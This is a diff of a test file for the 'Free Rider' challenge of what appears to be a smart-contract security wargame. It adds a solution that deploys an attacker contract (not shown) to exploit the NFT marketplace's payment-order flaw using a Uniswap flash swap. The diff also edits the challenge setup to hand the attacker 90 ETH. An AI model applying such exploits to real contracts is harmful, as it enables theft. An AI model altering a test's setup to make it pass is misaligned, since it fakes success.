@@ -30,7 +30,6 @@ describe('[Challenge] Free Rider', function () {
             attacker.address,
             "0x6f05b59d3b20000", // 0.5 ETH
         ]);
-
         // Deploy WETH contract
         this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();
 
@@ -45,7 +44,7 @@ describe('[Challenge] Free Rider', function () {
             this.uniswapFactory.address,
             this.weth.address
         );
-        
+
         // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
         // Note that the function takes care of deploying the pair automatically
         await this.token.approve(
@@ -61,7 +60,7 @@ describe('[Challenge] Free Rider', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_WETH_RESERVE }
         );
-        
+
         // Get a reference to the created Uniswap pair
         const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
         this.uniswapPair = await UniswapPairFactory.attach(
@@ -98,13 +97,26 @@ describe('[Challenge] Free Rider', function () {
         // Deploy buyer's contract, adding the attacker as the partner
         this.buyerContract = await (await ethers.getContractFactory('FreeRiderBuyer', buyer)).deploy(
             attacker.address, // partner
-            this.nft.address, 
+            this.nft.address,
             { value: BUYER_PAYOUT }
         );
+        await deployer.sendTransaction({ to: attacker.address, value: ethers.utils.parseEther('90') });
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // The payment is sent to the NFT owner while the NFT is transfered before the payment
+        // Make use of flash swap of uniswap to have enough (15) ETH to purchase the first NFT
+        const AttackerFactory = await ethers.getContractFactory("FreeRiderAttacker", attacker);
+        this.attacker = await AttackerFactory.deploy(
+            this.uniswapPair.address,
+            this.uniswapFactory.address,
+            this.marketplace.address,
+            this.nft.address,
+            this.buyerContract.address
+        )
+        this.attacker.connect(attacker).attack(NFT_PRICE);
     });
 
     after(async function () {
